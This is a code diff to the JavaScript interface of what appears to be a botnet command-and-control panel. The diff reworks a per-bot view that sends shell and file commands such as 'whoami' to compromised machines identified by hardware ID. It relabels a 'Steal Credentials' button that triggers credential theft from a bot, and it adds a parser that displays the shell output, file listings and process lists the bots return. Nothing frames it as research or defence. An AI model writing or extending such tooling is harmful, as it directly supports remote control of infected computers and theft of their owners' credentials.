@@ -353,19 +353,17 @@ function renderBotDetail(bot, commands) {
     ]),
     el('div', { className: 'form-group' }, [
       el('label', { for: 'cmd-args' }, ['Arguments']),
-      el('input', { type: 'text', id: 'cmd-args', name: 'args', placeholder: 'Command arguments...' })
+      el('input', { type: 'text', id: 'cmd-args', name: 'args', placeholder: 'e.g. whoami  or  {"path":"/etc"}' })
     ]),
-    el('button', { type: 'submit', className: 'btn btn-primary' }, ['Send Command'])
+    el('div', { className: 'btn-row' }, [
+      el('button', { type: 'submit', className: 'btn btn-primary' }, ['Send']),
+      el('button', {
+        type: 'button', className: 'btn btn-secondary',
+        onClick: () => dispatchSteal(bot.hwid),
+      }, ['Steal Credentials']),
+    ]),
   ]);
   panel.appendChild(form);
-
-  // Steal button
-  panel.appendChild(el('div', { className: 'action-buttons' }, [
-    el('button', {
-      className: 'btn btn-danger btn-sm',
-      onclick: () => dispatchSteal(bot.hwid),
-    }, ['Steal']),
-  ]));
 
   // Tabs
   const tabBar = el('div', { className: 'tab-bar' }, [
@@ -413,7 +411,7 @@ function renderBotDetail(bot, commands) {
         el('td', {}, [formatTime(cmd.created_at)]),
         el('td', {}, [cmd.command_type]),
         el('td', {}, [el('span', { className: `status-badge ${cmd.status}` }, [cmd.status])]),
-        el('td', { className: 'response-cell' }, [truncate(cmd.response || '-', 50)])
+        el('td', { className: 'response-cell' }, [truncate(extractResponse(cmd), 80)])
       ]));
     }
     table.appendChild(tbody);
@@ -578,7 +576,7 @@ function renderTasks(tasks) {
       el('td', {}, [task.command_type || task.command]),
       el('td', {}, [truncate(task.args || '-', 30)]),
       el('td', {}, [el('span', { className: `status-badge ${task.status}` }, [task.status])]),
-      el('td', { className: 'response-cell' }, [truncate(task.response || '-', 50)])
+      el('td', { className: 'response-cell' }, [truncate(extractResponse(task), 80)])
     ]));
   }
 }
@@ -752,6 +750,24 @@ function downloadConfig() {
 // ============================================================================
 // Utility Functions
 // ============================================================================
+
+function extractResponse(cmd) {
+  if (!cmd.response_data) return cmd.response_status === 'error' ? 'error' : '-';
+  try {
+    const d = JSON.parse(cmd.response_data);
+    const inner = d.data ?? d;
+    if (typeof inner === 'string') return inner;
+    // Shell: prefer stdout, fall back to stderr
+    if (inner.stdout !== undefined) return inner.stdout.trim() || inner.stderr.trim() || '-';
+    // File list: count entries
+    if (inner.entries) return `${inner.entries.length} entries`;
+    // Process list
+    if (inner.processes) return `${inner.processes.length} processes`;
+    return JSON.stringify(inner);
+  } catch (_) {
+    return cmd.response_data;
+  }
+}
 
 function formatTime(isoString) {
   if (!isoString) return '-';
